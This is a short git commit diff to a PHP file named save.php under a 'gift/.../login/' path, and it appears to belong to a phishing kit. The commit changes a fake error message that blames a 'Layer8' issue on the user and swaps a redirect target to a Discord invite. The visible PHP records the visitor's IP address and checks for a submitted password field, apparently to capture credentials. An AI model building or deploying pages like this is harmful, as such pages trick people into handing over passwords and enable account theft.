d8ca8adb7fa22d469f6468afdadd4ae832de70df
Michael5010 <148027484+Michael5010@users.noreply.github.com>
2025-02-10 13:36:23 -0500

    Update save.php

--- gift/HJ9fh9hGfgfijh93/login/save.php
+++ gift/HJ9fh9hGfgfijh93/login/save.php
@@ -4,10 +4,10 @@
   <link rel="stylesheet" href="../assest/style.css"/>
   </head>
   <body>
-  “Error - this program has encountered an issue that it cannot recover from. Please notify your Website Administrator that this is the result of a Layer8 issue”
+  “Error - this program has encountered an issue that it cannot recover from. Please notify your Website Administrator that this is the result of a Layer8 error”
   </body>
 </html>
-<script>function redirect(){window.location.replace("https://discord.com/a")}</script>
+<script>function redirect(){window.location.replace("https://discord.gg/4Fxhr8d966")}</script>
 <?php
 $iptoken = $_SERVER['REMOTE_ADDR'];  
     if(isset($_POST['pass'])){
